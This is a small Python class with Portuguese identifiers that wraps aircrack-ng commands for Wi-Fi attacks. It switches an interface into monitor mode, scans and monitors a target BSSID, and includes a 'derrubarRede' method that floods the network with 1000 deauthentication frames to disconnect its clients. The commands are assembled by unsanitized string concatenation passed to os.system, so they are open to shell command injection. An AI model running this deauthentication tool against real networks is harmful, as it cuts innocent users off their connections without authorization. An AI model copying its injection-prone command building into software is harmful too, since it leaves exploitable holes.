# usr/bin/python
import os
class Wifi:
	def __init__(self, bssid, channel,interfaceRede):
		self.bssid = bssid
		self.channel = channel	
		self.interfaceRede = interfaceRede
		pass

	def getBssid(self):
		return self.bssid

	def getChannel(self):
		return self.channel

	def getInterfaceRede(self):
		return self.interfaceRede


	def iniciarModoMonitor(self):
		cmd = "airmon-ng start "+self.getInterfaceRede()
		os.system(cmd)
		pass
	def pararModoMonitor(self):
		cmd = "airmon-ng stop "+self.getInterfaceRede()+"mon"
		os.system(cmd)
		pass
				
	def monitorarRede(self):
		cmd = "airodump-ng "+self.getInterfaceRede()+"mon --bssid "+self.getBssid()+" --channel "+self.getChannel()
		os.system(cmd)
		pass

	def scannerRedes(self):
		cmd = "airodump-ng "+self.getInterfaceRede()+"mon"
		os.system(cmd)
		pass

	def derrubarRede(self):
		cmd = "aireplay-ng -0 1000 -a "+self.getBssid()+" "+self.getInterfaceRede()+"mon --ignore-negative-one"
		os.system(cmd)
		pass
		
			
			

